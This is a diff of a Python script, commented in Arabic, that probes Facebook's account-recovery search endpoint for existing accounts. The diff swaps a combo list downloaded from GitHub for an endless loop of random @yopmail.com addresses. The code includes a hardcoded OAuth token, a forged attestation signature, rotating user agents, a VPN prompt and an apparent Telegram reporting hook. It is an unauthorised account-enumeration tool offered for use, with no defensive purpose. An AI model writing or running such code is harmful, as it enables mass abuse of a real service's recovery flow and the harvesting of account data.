@@ -5,7 +5,7 @@ import time
 import random
 from uuid import uuid4
 from fake_useragent import UserAgent
-
+from time import sleep
 
 R = '\x1b[38;5;1m'   # أحمر
 M = '\x1b[38;5;244m' # رمادي 
@@ -32,13 +32,12 @@ def send_telegram(message):
     except:
         pass
 
+ibra = "qwertyuioplkjhgfdsamnbvcxz"
 
-url = "https://raw.githubusercontent.com/mesa14719-sketch/PY-COMBO/refs/heads/main/domain_email.txt"
-response = requests.get(url)
-emails = response.text.splitlines()
-
-for user in emails:
-    email = str(user).strip()
+while True:
+    
+    len =random.randint(3,5)
+    email ="".join(random.choice(ibra) for _ in range (len)) + "@yopmail.com"
     ua = UserAgent()
     headers = {"User-Agent": ua.random, "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async", "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", "x-fb-conn-uuid-client": str(uuid4()).replace("-", "")}
     clientinput = {"text_input_id": "lh37sk:580", "flash_call_permissions_status": {"READ_PHONE_STATE": "DENIED", "READ_CALL_LOG": "DENIED", "ANSWER_PHONE_CALLS": "DENIED"}, "was_headers_prefill_available": 0, "sfdid": str(uuid4()), "attestation_result": {"data": "", "signature": "MEUCIQCBSrzyU6wUrgZaV38L30a31rPMeiQcj2YCWvuL9zZZTwIgelOJPF+yzdSqoF0B8bsEZ04x1WMAE91/+p13tLvAPqmc=", "keyHash": "e93b8ab100a56f1ea430311c3c4dfb11d07b1b89eb65514bf45b08e1be98bec5"}, "fetched_email_token_list": {}, "search_query": email, "android_build_type": "", "sim_state": 5, "accounts_list": [], "is_oauth_without_permission": 0, "ig_oauth_token": [], "search_screen_type": "email", "is_whatsapp_installed": 1, "lois_settings": {"lois_token": ""}, "was_headers_prefill_used": 0, "headers_infra_flow_id": str(uuid4()), "fetched_email_list": [""], "sso_accounts_auth_data": [], "encrypted_msisdn": ""}
@@ -69,5 +68,7 @@ for user in emails:
     except Exception:
         print(R+"  خطأ شغل vpn 1111")
         sys.exit()
+        
+        
 
     
